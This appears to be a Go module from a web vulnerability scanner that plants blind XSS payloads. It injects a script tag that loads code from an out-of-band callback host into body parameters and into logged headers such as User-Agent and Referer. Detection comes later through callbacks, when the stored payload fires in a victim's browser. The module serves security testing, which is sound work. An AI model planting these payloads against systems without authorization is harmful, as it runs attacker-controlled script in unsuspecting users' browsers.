package blind_xss_oast

import (
	"fmt"
	"strings"

	"github.com/pkg/errors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/oast/oastclass"
	"github.com/vigolium/vigolium/pkg/output"
)

// injectionType labels the payload context; the class (oastclass.BlindXSS)
// drives the rating. No "header" in the label: the finding would otherwise
// rebuild the planting request as a header injection for body points.
const injectionType = "blind xss"

// blindXSSSource is implemented by the real OAST service: the operator's opt-in
// (oast.enabled_blind_xss) and an optional external script src (an XSS hunter
// they run). Kept off modkit.OASTProvider so fakes need not implement it.
type blindXSSSource interface {
	BlindXSSEnabled() bool
	BlindXSSSrc() string
}

// loggedHeaders are the request headers commonly stored and rendered later
// (access-log viewers, analytics and support consoles). Other headers are
// rarely stored, so planting in them only adds noise.
var loggedHeaders = map[string]bool{
	"user-agent":      true,
	"referer":         true,
	"x-forwarded-for": true,
}

// payloadTemplate breaks out of an attribute or text context and loads a
// script from the callback host; %s is the script URL.
const payloadTemplate = `"'><script src="%s"></script>`

// Module plants blind XSS payloads; findings arrive out of band.
type Module struct {
	modkit.BaseActiveModule
	rhm dedup.Lazy[dedup.RequestHashManager]
}

// New creates the blind XSS module.
func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeInsertionPoint,
			modkit.BodyParamTypes|modkit.HeaderTypes,
		),
		rhm: dedup.LazyDefaultRHM("blind_xss_oast"),
	}
	m.ModuleTags = ModuleTags
	return m
}

// plantable reports whether a point is a stored-input candidate: a body
// value, or one of loggedHeaders.
func plantable(ip httpmsg.InsertionPoint) bool {
	switch ip.Type() {
	case httpmsg.INS_PARAM_NAME_BODY, httpmsg.INS_ENTIRE_BODY:
		return false
	case httpmsg.INS_HEADER:
		return loggedHeaders[strings.ToLower(ip.Name())]
	}
	return true
}

// ScanPerInsertionPoint plants one script payload into a stored-input point.
// It only runs when the operator enabled blind XSS (oast.enabled_blind_xss):
// the payload stays in the target's data and fires in someone else's browser.
func (m *Module) ScanPerInsertionPoint(
	ctx *httpmsg.HttpRequestResponse,
	ip httpmsg.InsertionPoint,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	prov := scanCtx.OASTProv()
	if prov == nil || !prov.Enabled() {
		return nil, nil
	}
	src, ok := prov.(blindXSSSource)
	if !ok || !src.BlindXSSEnabled() || !plantable(ip) {
		return nil, nil
	}

	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}
	if !infra.IsValidForInjectionVulns(urlx, ctx) {
		return nil, nil
	}
	if rhm := m.rhm.Get(scanCtx.DedupMgr()); rhm != nil {
		if !rhm.ShouldCheckInsertionPoint(urlx, ctx.Request(), ip.Name(), ip.BaseValue(), fmt.Sprintf("%d", ip.Type())) {
			return nil, nil
		}
	}

	// An external hunter src (blind_xss_src) reports through its own channel;
	// otherwise mint a correlated host so the callback becomes a finding of
	// this scan.
	scriptURL := src.BlindXSSSrc()
	host := ""
	if scriptURL == "" {
		host = modkit.OASTURLFor(prov, oastclass.BlindXSS, urlx.String(), ip.Name(), injectionType, ModuleID, ctx.Request().ID())
		if host == "" {
			return nil, nil
		}
		scriptURL = "https://" + host + "/b.js"
	}
	payload := fmt.Sprintf(payloadTemplate, scriptURL)
	if host != "" {
		prov.RecordPayload(host, payload)
	}

	req := httpmsg.NewRequestResponseRaw(ip.BuildRequest([]byte(payload)), ctx.Service())
	resp, _, err := httpClient.Execute(req, http.Options{})
	if err != nil {
		// Nothing planted (or the host is down); there is no in-band signal
		// to report either way.
		return nil, nil
	}
	resp.Close()
	// Results arrive asynchronously (possibly much later) via OAST callbacks.
	return nil, nil
}
